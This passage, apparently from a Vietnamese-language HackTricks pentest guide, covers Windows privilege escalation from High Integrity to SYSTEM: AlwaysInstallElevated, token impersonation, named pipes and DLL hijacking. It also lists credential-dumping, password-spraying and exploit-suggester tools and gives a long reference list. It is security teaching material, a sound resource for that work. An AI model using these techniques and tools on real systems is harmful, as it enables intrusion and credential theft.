> Khi tạo service binary, hãy đảm bảo đó là một service hợp lệ hoặc binary thực hiện các hành động cần thiết thật nhanh, vì nó sẽ bị dừng sau 20 giây nếu không phải là service hợp lệ.

### AlwaysInstallElevated

Từ một tiến trình High Integrity, bạn có thể thử **bật các registry entry AlwaysInstallElevated** và **cài đặt** một reverse shell bằng một wrapper _**.msi**_.\
[Xem thêm thông tin về các registry key liên quan và cách cài đặt gói _.msi_ tại đây.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Bạn có thể** [**tìm code tại đây**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Nếu có các token privilege này (có lẽ bạn sẽ thấy chúng trong một tiến trình High Integrity), bạn sẽ có thể **mở gần như bất kỳ tiến trình nào** (ngoại trừ các tiến trình được bảo vệ) bằng SeDebug privilege, **sao chép token** của tiến trình đó và tạo một **tiến trình tùy ý với token đó**.\
Kỹ thuật này thường **chọn một tiến trình bất kỳ đang chạy dưới quyền SYSTEM với tất cả token privilege** (_đúng vậy, bạn có thể tìm thấy các tiến trình SYSTEM không có đầy đủ token privilege_).\
**Bạn có thể tìm thấy** [**ví dụ code thực hiện kỹ thuật này tại đây**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Kỹ thuật này được meterpreter sử dụng để leo thang quyền trong `getsystem`. Kỹ thuật này bao gồm **tạo một pipe rồi tạo/lạm dụng một service để ghi vào pipe đó**. Sau đó, **server** tạo pipe bằng privilege **`SeImpersonate`** có thể **impersonate token** của client của pipe (service), qua đó có được quyền SYSTEM.\
Nếu muốn [**tìm hiểu thêm về named pipe, hãy đọc nội dung này**](#named-pipe-client-impersonation).\
Nếu muốn đọc ví dụ về [**cách chuyển từ High Integrity lên System bằng named pipe, hãy đọc nội dung này**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Nếu bạn có thể **chiếm quyền một dll** đang được **load** bởi một **tiến trình** chạy dưới quyền **SYSTEM**, bạn sẽ có thể thực thi code tùy ý với các quyền đó. Vì vậy, Dll Hijacking cũng hữu ích cho kiểu leo thang quyền này; hơn nữa, cách này **dễ thực hiện hơn nhiều từ một tiến trình High Integrity**, vì tiến trình đó có **quyền ghi** vào các thư mục được dùng để load dll.\
**Bạn có thể** [**tìm hiểu thêm về Dll hijacking tại đây**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Đọc:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Các binary impacket tĩnh](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Công cụ tốt nhất để tìm các vector leo thang quyền cục bộ trên Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kiểm tra các cấu hình sai và file nhạy cảm (**[**xem tại đây**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Đã bị phát hiện.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kiểm tra một số cấu hình sai có thể có và thu thập thông tin (**[**xem tại đây**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kiểm tra cấu hình sai**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Trích xuất thông tin phiên đã lưu của PuTTY, WinSCP, SuperPuTTY, FileZilla và RDP. Dùng -Thorough khi chạy cục bộ.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Trích xuất credential từ Credential Manager. Đã bị phát hiện.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Thử spray các mật khẩu đã thu thập được trên toàn domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh là công cụ PowerShell giả mạo ADIDNS/LLMNR/mDNS và man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Công cụ liệt kê Windows cơ bản phục vụ privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Tìm các lỗ hổng privesc đã biết (ĐÃ LỖI THỜI, thay bằng Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Kiểm tra cục bộ **(Cần quyền Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Tìm các lỗ hổng privesc đã biết (cần được biên dịch bằng VisualStudio) ([**bản biên dịch sẵn**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Liệt kê host để tìm cấu hình sai (thiên về công cụ thu thập thông tin hơn là privesc) (cần được biên dịch) **(**[**bản biên dịch sẵn**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Trích xuất credential từ nhiều phần mềm (có file exe biên dịch sẵn trên github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Bản port của PowerUp sang C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Kiểm tra cấu hình sai (có file executable biên dịch sẵn trên github). Không khuyến nghị. Công cụ này hoạt động không tốt trên Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kiểm tra các cấu hình sai có thể có (exe từ Python). Không khuyến nghị. Công cụ này hoạt động không tốt trên Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Công cụ được tạo dựa trên bài viết này (không cần accesschk để hoạt động bình thường, nhưng có thể sử dụng nó).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Đọc đầu ra của **systeminfo** và đề xuất các exploit có thể hoạt động (Python chạy cục bộ)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Đọc đầu ra của **systeminfo** và đề xuất các exploit có thể hoạt động (Python chạy cục bộ)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Bạn cần biên dịch project bằng đúng phiên bản .NET ([xem tại đây](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Để xem phiên bản .NET đã cài đặt trên host nạn nhân, bạn có thể chạy:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Kiến thức cơ bản về leo thang đặc quyền trên Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Leo thang đặc quyền bằng cách khai thác quyền thư mục yếu](http://www.greyhathacker.net/?p=738)
- [3] [Leo thang đặc quyền trên Windows - bảng tổng hợp](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Workshop leo thang đặc quyền cục bộ trên Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Tấn công Windows: AT là xu hướng mới (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Leo thang đặc quyền - Windows - Hướng dẫn OSCP toàn diện](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Leo thang đặc quyền - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Hướng dẫn leo thang đặc quyền trên Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Danh sách kiểm tra leo thang đặc quyền trên Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Leo thang đặc quyền trên Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Các phương pháp leo thang đặc quyền trên Windows dành cho pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Lừa đảo bằng macro Word VBA qua SMTP → giải mã thông tin xác thực hMailServer → Veeam CVE-2023-27532 lên SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak chuỗi định dạng + stack BOF → VirtualAlloc ROP (RCE) và đánh cắp kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Truy lùng Silver Fox: cuộc rượt đuổi giữa mèo và chuột trong bóng tối kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Lỗ hổng hệ thống tệp có đặc quyền trong một hệ thống SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Công cụ kiểm thử symbolic link – cách sử dụng CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Liên kết về quá khứ: Lạm dụng symbolic link trên Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (bản chuyển sang Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Phân giải module nguy hiểm trên Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Module Node.js: tải từ các thư mục `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Các thử thách trong danh sách kiểm tra C/C++, lời giải](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Hàm RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Chiếm quyền các tệp nhị phân dịch vụ](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own với Microslop: Kết hợp điều kiện race CLDFLT và DirectX Kernel để leo thang đặc quyền cục bộ trên Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Một I/O Ring thống trị tất cả: primitive khai thác đọc/ghi toàn diện trên Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Lạm dụng thao tác xóa tệp tùy ý để leo thang đặc quyền và các thủ thuật hữu ích khác](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Mã khai thác FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Tấn công WSUS Phần 2: CVE-2020-1013, lỗ hổng leo thang đặc quyền cục bộ trên Windows 10 dạng 1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Khám phá Credential Manager và Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Khi thay đổi image dẫn đến leo thang đặc quyền](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Trích xuất SSH private key từ SSH agent trên Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Biến máy chủ cập nhật doanh nghiệp thành nhà máy tạo backdoor (0_o) – Phần 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Biến máy chủ cập nhật doanh nghiệp thành nhà máy tạo backdoor (0_o) – Phần 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Leo thang đặc quyền bằng cách xóa thư mục Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Lần theo dấu vết để trở lại NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Tư vấn về lỗ hổng leo thang đặc quyền do offset bộ nhớ dùng chung trong Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
